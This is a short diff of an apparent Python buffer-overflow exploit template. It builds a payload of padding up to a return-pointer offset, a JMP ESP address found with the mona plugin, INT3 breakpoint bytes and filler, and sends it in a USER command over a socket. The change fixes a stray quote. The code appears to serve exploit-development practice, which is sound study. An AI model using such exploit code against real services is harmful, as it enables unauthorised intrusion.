@@ -15,7 +15,7 @@ ptr_jmp_esp =  #get this from !mona jmp -r esp -bpb "\x00\x0A" or !mona find -s 
 buf = ''
 buf += 'A'*(offset_srp-len(buf))
 buf += struct.pack("<I", ptr_jmp_esp)
-buf += "\xCC\xCC\xCC\xCC\"
+buf += "\xCC\xCC\xCC\xCC"
 buf += "D"*(buf_totlen-len(buf))
 
 s.send('USER username' +'\r\n')
